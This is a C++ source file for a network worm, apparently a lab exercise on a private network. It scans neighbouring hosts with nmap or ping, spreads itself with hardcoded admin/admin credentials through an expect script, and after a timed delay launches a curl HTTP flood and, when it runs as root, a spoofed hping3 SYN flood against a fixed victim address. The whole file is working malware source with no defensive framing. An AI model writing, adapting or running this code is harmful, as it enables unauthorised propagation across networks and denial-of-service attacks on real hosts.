#include "worm.hpp"

/* Returns a set containing the ip addresses that were visited */
set<string> get_visited(string path){
    set<string> result;
    ifstream file(path);
    if(!file.fail()){
        string ip;
        while(getline(file,ip)){
            result.insert(ip);
        }
        file.close();
    }
    return result;
}

/* Writes the ip addresses of the neighbours into the visited file */
void add_visited(string path, vector<string> ips_found){
    ofstream file(path, ios_base::app);
    for(size_t i=0; i<ips_found.size(); i++) file << ips_found.at(i)<<"\n";
    file.close();
}

/* Returns the ip addresses of the host where the program is running */
vector<string> find_subnet(){
    char ip[100];
    vector<string> result;
    string command = "ip -4 a | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1"; // command that returns the ip addresses
    FILE *fp = popen(command.c_str(), "r");
    if(fp==NULL){
        std::cerr<<"Error while finding subnet"<<std::endl;
        exit(EXIT_FAILURE);
    }
    while (fgets(ip, sizeof(ip), fp) != NULL) {
        ip[strcspn(ip, "\n")] = 0;
        result.push_back(string(ip));
    }
    if(fp!=NULL){
        fclose(fp);
    }
    return result;
}

/* Find the ip addresses of the adjacent hosts */
vector<string> scanNetwork() {
    string command;
    char ip[100];
    vector<string> subnets = find_subnet();
    add_visited("/tmp/visited.txt",subnets);
    set<string> visited = get_visited("/tmp/visited.txt");
    set<string> result;
    for(size_t i=1; i<subnets.size(); i++){
        string subnet = subnets.at(i);
        visited.insert(subnet);
        if(system("command -v nmap > /dev/null")==0){ // checks if nmap is installed
            string pref1 = "10.10.";
            string pref2 = "192.168.";
            auto res = mismatch(pref1.begin(), pref1.end(), subnet.begin());
            if(res.first == pref1.end()) command = "nmap -sn "+subnet.substr(0,subnet.rfind("."))+".0/29 -oG - | awk '/Up$/{print $2}'";
            else{
                res = mismatch(pref2.begin(), pref2.end(), subnet.begin());
                if(res.first == pref2.end()) command = "nmap -sn "+subnet.substr(0,subnet.rfind("."))+".0/24 -oG - | awk '/Up$/{print $2}'";
                else{
                    std::cerr << "Unknown ip address" <<std::endl;
                    exit(EXIT_FAILURE);
                }
            }
            FILE *fp = popen(command.c_str(), "r");
            if (fp == NULL){
                std::cerr<<"Error while executing nmap"<<std::endl;
                exit(EXIT_FAILURE);
            }
            else {
                while (fgets(ip, sizeof(ip), fp) != NULL) {
                    ip[strcspn(ip, "\n")] = 0;
                    if(visited.count(string(ip))==0 && strcmp(ip,subnet.c_str())) result.insert(string(ip));
                }
                fclose(fp);
            }
        }
        else{ // no nmap... find neighbours using ping
            string ip = subnet.substr(0,subnet.rfind(".")+1);
            for(int j=0; j<35; j++){
                string iptot = ip+to_string(j);
                if(visited.count(iptot)==0){
                    command = "ping -c 1 -W 1 "+iptot+" > /dev/null 2>&1";
                    if(system(command.c_str())==0) result.insert(iptot);
                }
            }
        }
    }
    vector<string> resv;
    copy(result.begin(), result.end(), back_inserter(resv));
    return resv;
}

/* Copy the worm and related files on the specified host */
int spreadWorm(string username, string password, string target_ip, string start_time) {
    string command = "/tmp/spread_w.exp "+username+" "+password+" "+target_ip+" "+start_time+" /tmp/worm /tmp/visited.txt /tmp/spread_w.exp";
    return system(command.c_str());
}

/* Wait (3 min - (arrival_time - start_time)) before starting the attack */
void wait(long start, long arrival){
    int time_to_sleep = 3*60*1000000 - (arrival - start);
    if(time_to_sleep > 0) usleep(time_to_sleep); 
}

/* Execute the malicious command */
int attack(string victim){
    string command = "while true; do curl -s http://"+victim+"/; done"; // http flood
    return system(command.c_str());
}

int main(int argc, char* argv[]) {
    string user = "admin";
    string psw = "admin";
    string victim = "192.168.2.10";
    string safe_host = "192.168.0.30";
    string start_time;
    struct timeval ts;
    gettimeofday(&ts,NULL);
    long arrival = ts.tv_usec + ts.tv_sec*1000000;
    if(argc>1) start_time = string(argv[1]);
    else start_time = to_string(arrival);
    vector<string> ips_found = scanNetwork(); // find neighbours
    if(ips_found.size()>0){                   // if there are neighbours, infect them
        add_visited("/tmp/visited.txt",ips_found);
        for(size_t i=0; i<ips_found.size(); i++) {
            if(strcmp(ips_found.at(i).c_str(), safe_host.c_str())) spreadWorm(user,psw,ips_found.at(i), start_time);
        }
    }
    wait(stol(start_time), arrival);
    int pid = fork();
    if(pid<0) exit(EXIT_FAILURE);
    else if(pid==0){
        string command = "while true; do hping3 -S -p 80 -a 192.168.2.10 --flood "+victim+"; done";
        if(geteuid()==0) system(command.c_str());  // if worm is executed as root, execute this command
    }
    else{
        attack(victim);
    }
    return 0;
}
